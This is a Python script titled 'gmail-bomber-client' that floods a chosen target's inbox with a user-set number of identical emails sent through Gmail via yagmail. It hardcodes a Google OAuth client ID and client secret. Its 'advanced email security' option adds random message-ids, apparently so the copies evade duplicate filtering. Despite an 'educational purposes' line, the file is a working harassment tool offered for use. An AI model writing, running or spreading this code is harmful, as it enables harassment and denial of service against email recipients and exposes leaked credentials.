import yagmail as yg 
import random
import os 
import platform
import sys
oauth_client_secret='''{
  "installed": {
    "client_id": "862726500644-mba83qqf9kq69c5mk9u5h2dn4iocdspq.apps.googleusercontent.com",
    "client_secret":"Hvi-J-wr97hTAh3F_4GMGZIu",
    "redirect_uris": ["https://localhost/"],
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://accounts.google.com/o/oauth2/token"
  }
}'''
print ("gmail-bomber-client version: 1.0")
print("join the official discord server of gmail-bomber-client\nall updates of gmail-bomber-client will be published here\ndiscord server join link: https://discord.gg/ndp64XbtPp\n")
print ("github: https://github.com/bagarrattaa/gmail-bomber-client ")
print("this tool is only for educational purposes")
print ("please note: it uses your gmail id to send mails so I would suggest you not to over bomb other people, enable our advanced email security feature \n which you can enable after entering amount")
if os.path.exists("login.json"):
    accounts=yg.SMTP(oauth2_file="login.json")
else: 
    f=open("login.json","w")
    f.write(oauth_client_secret)
    f.close()
    accounts=yg.SMTP(oauth2_file="login.json")
to=str(input("enter target email to bomb "))
sub=str(input("enter subject "))
msg=str(input("enter message "))
am=int(input("enter amount of msgs to send "))
sec=str(input("do you want to enable advanced email security?"))

for i in range (0,am): 
    if sec=="y" or sec=="Y" or sec=="yes" or sec=="YES" or sec=="Yes": 
        msgid=str(random.randint(0000000000,9999999999))+str("\n\n\n\n")
        accounts.send(to=to,subject=sub,contents=msg+"\n\n\n message-id: "+msgid)
        print (f"{i+1} msgs sent")
    else : 

        accounts.send(to=to,subject=sub,contents=msg)
        print (f"{i+1} msgs sent")